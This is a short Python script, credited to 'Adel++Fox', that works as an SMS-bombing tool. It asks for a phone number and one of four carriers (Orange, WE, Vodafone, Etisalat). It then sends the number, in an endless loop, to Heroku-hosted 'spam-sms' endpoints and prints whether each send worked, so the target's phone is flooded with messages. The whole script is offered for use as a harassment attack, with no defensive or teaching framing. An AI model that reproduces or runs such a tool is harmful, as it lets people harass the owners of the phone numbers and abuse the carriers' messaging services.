import os,sys
os.system("clear")
try:
	import requests
except:
	os.system("pip install --upgrade pip")
	os.system("pip install requests")
	os.system("clear")

#color
R ='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
P='\033[1;36m'
W='\033[1;37m'
X='\033[1;38m'
A='\033[1;39m'


global s
global n



n = ('\n')
s = requests.session()

print(R+"[+]"+B+"___"+W+"__Developer__"+P+"Adel++Fox"+B+"____"+R+"[+]"+n)

def orange():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url1 = ('https://adel-fox-spam-sms-orange.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url1).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass
	
def we():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url2 =('https://adel-fox-spam-sms-we.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url2).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass
	
def vodafone():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url3 =('https://adelfox-spam-sms-vodafone.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url3).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass

def etisalat():
	number =input(n+P+"[+]Enter Number:")
	print(n)
	url4 =('https://adel-fox-spam-sms-etisalat.herokuapp.com/?number='+number)
	while True:
		try:
			req = s.get(url4).json()
			re = req['result']
			if 'Done send' in re:
				print(G+'Done Send ✅')
			elif 'Failed' in re:
				print(R+'Failed ❌')
			else:
				print(R+'Error')
		except:pass


def list():
	print(G+"[1]orange")
	print("[2]we")
	print("[3]vodafone")
	print("[4]etisalat")
list()
choose = input(n+P+"[+]choose:")

if choose =='1':
	orange()
	
elif choose =='2':
	we()
	
elif choose =='3':
	vodafone()
	
elif choose =='4':
	etisalat()
else:
    print(n+R+"Error,  choose from list")
	
